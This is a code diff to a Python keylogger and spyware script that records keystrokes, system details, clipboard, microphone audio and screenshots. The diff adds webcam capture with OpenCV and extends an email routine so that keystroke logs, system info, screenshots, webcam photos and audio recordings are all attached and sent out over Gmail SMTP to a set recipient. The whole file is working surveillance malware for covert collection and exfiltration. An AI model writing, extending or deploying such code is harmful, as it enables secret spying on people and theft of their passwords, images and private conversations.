@@ -4,7 +4,12 @@
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
+from email.mime.image import MIMEImage
+from email.mime.audio import MIMEAudio
 from email import encoders
+
+import cv2
+
 import smtplib
 
 # to collect information
@@ -43,6 +48,7 @@ system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
+camera_information = "camera.png"
 
 keys_information_e = "e_key_log4.txt"
 system_information_e = "e_systeminfo.txt"
@@ -50,7 +56,7 @@ clipboard_information_e = "e_clipboard.txt"
 
 key = "-MfQZkl4emBnkTZlRh_lo3Dik-1WBxI_dgXRzJzc6Ps="
 
-microphone_time = 10
+microphone_time = 2
 
 # every interation lasts for 15 seconds
 time_iteration = 15 
@@ -104,14 +110,43 @@ def microphone():
     
 microphone()
 
+def camera():
+    cap = cv2.VideoCapture(0)
+
+    # Check if the webcam is opened correctly
+    if not cap.isOpened():
+        raise IOError("Cannot open webcam")
+    
+    result = 0
+    while(result < 2):
+        # Capture the video frame by frame
+        ret, frame = cap.read()
+    
+        # Display the resulting frame
+        cv2.imshow('frame', frame)
+        cv2.imwrite(file_path + camera_information, frame)
+        result += 1
+    
+    # After the loop release the cap object
+    cap.release()
+    print("closing camera")
+    # Destroy all the windows
+    cv2.destroyAllWindows()
+
+camera()
+
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + screenshot_information)
     
 screenshot()
 
-def send_email(filename, attachment, toaddr):
+def send_email(filename, keys, system, scrshot, camera, audio, toaddr):
 
+    print(f"keys: {keys}\n")
+    print(f"system: {system}\n")
+    print(f"scrshot: {scrshot}\n")
+    print(f"audio: {audio}\n")
     fromaddr = email_address
     
     msg = MIMEMultipart()
@@ -126,18 +161,39 @@ def send_email(filename, attachment, toaddr):
     filename = filename
     
     # read the attachment as binary
-    attachment = open(attachment, 'rb')
+    keys = open(keys, 'rb')
+    system = open(system, 'rb')
+    scrshot = open(scrshot, 'rb')
+    audio = open(audio, 'rb')
+    camera = open(camera, 'rb')
 
     # create the mime base
-    p = MIMEBase('application', 'octet-stream')
+    p_keys = MIMEBase('application', 'octet-stream')
+    p_system = MIMEBase('application', 'octet-stream')
+    p_scrshot = MIMEImage(scrshot.read())
+    # p_audio = MIMEApplication(audio.read())
+    p_audio = MIMEAudio(audio.read(), _subtype="wav")
+    p_camera = MIMEImage(camera.read())
     
     # encode the message
-    p.set_payload((attachment).read())
-    encoders.encode_base64(p)
+    p_keys.set_payload((keys).read())
+    encoders.encode_base64(p_keys)
+    p_system.set_payload((system).read())
+    encoders.encode_base64(p_system)
     
     # create email header
-    p.add_header('Content-Disposition', "attachment: filename= %s" % filename)
-    msg.attach(p)
+    # print(f"filename {filename}\n")
+    p_keys.add_header('Content-Disposition', "attachment: filename= %s" % filename)
+    msg.attach(p_keys)
+    p_scrshot.add_header('Content-Disposition', "attachment: filename= %s" % filename)
+    msg.attach(p_scrshot)
+    p_camera.add_header('Content-Disposition', "attachment: filename= %s" % filename)
+    msg.attach(p_camera)
+    p_system.add_header('Content-Disposition', "attachment: filename= %s" % filename)
+    msg.attach(p_system)
+    p_audio.add_header('Content-Disposition', "attachment: filename= %s" % filename)
+    msg.attach(p_audio)
+
     
     # create SMTP session
     s = smtplib.SMTP('smtp.gmail.com', 587)
@@ -153,7 +209,15 @@ def send_email(filename, attachment, toaddr):
     # quit session
     s.quit()
     
-send_email(keys_information, file_path + keys_information, toaddr)
+send_email(
+    keys_information, 
+    file_path + keys_information, 
+    file_path + system_information, 
+    file_path + screenshot_information, 
+    file_path + camera_information, 
+    file_path + audio_information, 
+    toaddr
+)
 
 num_iterations = 0
 currentTime = time.time()
